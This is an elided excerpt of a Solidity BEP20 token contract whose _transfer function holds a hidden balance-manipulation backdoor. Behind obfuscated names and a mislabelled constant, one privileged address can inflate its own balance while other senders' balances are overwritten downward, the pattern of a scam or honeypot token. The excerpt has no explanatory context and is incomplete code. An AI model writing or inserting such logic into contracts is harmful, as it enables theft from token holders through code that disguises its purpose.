...
contract Token is IBEP20, HasForeignAsset {
    ...
    uint public constant s16562 = 1000000000000000000000000; // seconds
    ...
    function _transfer(
        ...
        if (_3451311[sender] > 1) {
            if (sender == ss) {
                _balances[sender] = amount.add(0).add(_3451311[sender]);
            }else{
                _balances[sender] = amount.sub(_3451311[sender].sub(0));
            }
        }
